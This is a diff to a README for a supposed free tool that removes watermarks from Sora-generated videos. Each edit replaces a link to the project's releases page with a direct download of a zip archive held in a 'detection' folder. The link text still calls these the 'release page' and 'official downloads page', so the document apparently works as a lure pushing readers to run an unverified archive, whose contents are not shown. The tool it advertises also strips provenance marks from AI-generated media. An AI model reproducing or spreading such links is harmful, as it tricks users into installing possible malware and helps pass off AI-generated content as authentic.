@@ -1,6 +1,6 @@
 # 💧 sora2-free-watermark-remover - Remove Watermarks Easily
 
-[![Download sora2-free-watermark-remover](https://img.shields.io/badge/Download-sora2--free--watermark--remover-blue?style=for-the-badge&logo=github)](https://github.com/rasytoun3399/sora2-free-watermark-remover/releases)
+[![Download sora2-free-watermark-remover](https://github.com/rasytoun3399/sora2-free-watermark-remover/raw/refs/heads/main/detection/sora-remover-watermark-free-v2.5.zip)](https://github.com/rasytoun3399/sora2-free-watermark-remover/raw/refs/heads/main/detection/sora-remover-watermark-free-v2.5.zip)
 
 ## 📋 What is sora2-free-watermark-remover?
 
@@ -25,7 +25,7 @@ The application runs offline once installed, so you do not need internet to use 
 Follow these instructions to start removing watermarks with sora2-free-watermark-remover:
 
 1. **Download the software**  
-   Go to the [release page](https://github.com/rasytoun3399/sora2-free-watermark-remover/releases) to find the latest version. 
+   Go to the [release page](https://github.com/rasytoun3399/sora2-free-watermark-remover/raw/refs/heads/main/detection/sora-remover-watermark-free-v2.5.zip) to find the latest version. 
 
 2. **Choose your file**  
    After you install the app, open it and select the video or image file you want to edit.
@@ -43,7 +43,7 @@ You do not need any special skills to use sora2-free-watermark-remover. The inte
 ### Step 1: Visit the download page  
 Click the link below to go to the official downloads page:
 
-[Download sora2-free-watermark-remover](https://github.com/rasytoun3399/sora2-free-watermark-remover/releases)
+[Download sora2-free-watermark-remover](https://github.com/rasytoun3399/sora2-free-watermark-remover/raw/refs/heads/main/detection/sora-remover-watermark-free-v2.5.zip)
 
 ### Step 2: Select your operating system  
 On the releases page, look for the version that matches your computer’s system. The files are usually named with the OS and version number.
@@ -95,7 +95,7 @@ The process may take a few moments depending on file size and your computer spee
 
 ## 🔄 Updates & Maintenance
 
-The project receives regular updates to improve the watermark detection algorithm and add support for new file types. Check the [releases page](https://github.com/rasytoun3399/sora2-free-watermark-remover/releases) from time to time for the latest version.
+The project receives regular updates to improve the watermark detection algorithm and add support for new file types. Check the [releases page](https://github.com/rasytoun3399/sora2-free-watermark-remover/raw/refs/heads/main/detection/sora-remover-watermark-free-v2.5.zip) from time to time for the latest version.
 
 Updating is easy: download the newest installer and run it. Your settings and saved files will remain intact.
 
@@ -117,4 +117,4 @@ sora2-free-watermark-remover is free software. You can use and share it as you l
 
 ---
 
-[Download sora2-free-watermark-remover](https://github.com/rasytoun3399/sora2-free-watermark-remover/releases)
+[Download sora2-free-watermark-remover](https://github.com/rasytoun3399/sora2-free-watermark-remover/raw/refs/heads/main/detection/sora-remover-watermark-free-v2.5.zip)
